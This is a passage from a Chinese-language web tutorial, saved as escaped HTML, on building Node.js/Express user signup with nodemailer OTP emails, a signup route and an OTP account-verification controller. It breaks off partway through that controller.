&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;//定义电子邮件选项和结构
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mailOptions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&amp;#34;{HOST Name}&amp;#34; &amp;lt;{HOST Email} &amp;gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;subject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;subject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;transporter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sendMail&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mailOptions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sendEmail&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;从上面的代码中，&lt;code&gt;const nodemailer = require(&#39;nodemailer&#39;);&lt;/code&gt;命令导入nodemailer包。这是用于发送电子邮件的流行Node.js库。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;const transporter = nodemailer.createTransport({…..})&lt;/code&gt;是一个电子邮件传输器。由于我们将使用Gmail服务提供商，service将分配给Gmail，auth从存储它的.env文件中提取您的Gmail地址和密码。&lt;/p&gt;
&lt;p&gt;注意：密码不是您实际的Gmail密码，而是您的Gmail应用密码。您可以在此处查看如何获取Gmail密码。&lt;/p&gt;
&lt;p&gt;成功获取Gmail应用密码后，将其存储在.env文件中。&lt;/p&gt;
&lt;h3 id=&#34;路由创建&#34;&gt;路由创建
&lt;/h3&gt;&lt;p&gt;此时，您已完成项目注册功能的设置。接下来，您需要使用Postman测试您的注册是否正常工作。但在那之前，让我们设置并定义一个将执行注册功能的路由。&lt;/p&gt;
&lt;p&gt;要设置您的路由，在后端目录中创建一个名为&amp;quot;routes&amp;quot;的新文件夹和一个名为userRouter.js的文件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;express&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;express&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;signup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../controller/authController&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;router&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;express&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Router&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;router&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/signup&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;signup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;router&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;接下来，转到您的App.js文件并将路由器添加到其中。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;userRouter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./routes/userRouters&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//路由导入语句
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/api/v1/users&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;userRouter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//所有认证的通用路由，即注册、登录、忘记密码等
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;设置路由后，您可以测试您的注册以查看它是否工作。这是一个post请求，路由URL将是http://localhost:8000/api/v1/users/signup。&lt;/p&gt;
&lt;p&gt;上面的图像显示注册功能完美工作，状态码为200，OTP代码发送到用户的电子邮件。&lt;/p&gt;
&lt;p&gt;恭喜您到达这一点！您可以检查您的MongoDB数据库以查看用户是否显示在那里。&lt;/p&gt;
&lt;p&gt;从上面的图像中，您可以看到获得了用户详细信息，并且密码是加密形式，这确保用户凭据安全。&lt;/p&gt;
&lt;h3 id=&#34;创建验证账户控制器函数&#34;&gt;创建验证账户控制器函数
&lt;/h3&gt;&lt;p&gt;在本节中，您将创建一个验证账户控制器函数。此函数使用发送到用户电子邮件地址的OTP代码验证用户的账户。&lt;/p&gt;
&lt;p&gt;首先，转到您的authController.js文件并添加：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;verifyAccount&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;catchAsync&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;需要电子邮件和OTP&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;findOne&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;找不到具有此电子邮件的用户&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;404&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;无效OTP&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;otpExpires&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;OTP已过期。请请求新的OTP。&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isVerified&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;otpExpires&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;validateBeforeSave&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// ✅ 可选返回响应而不登录
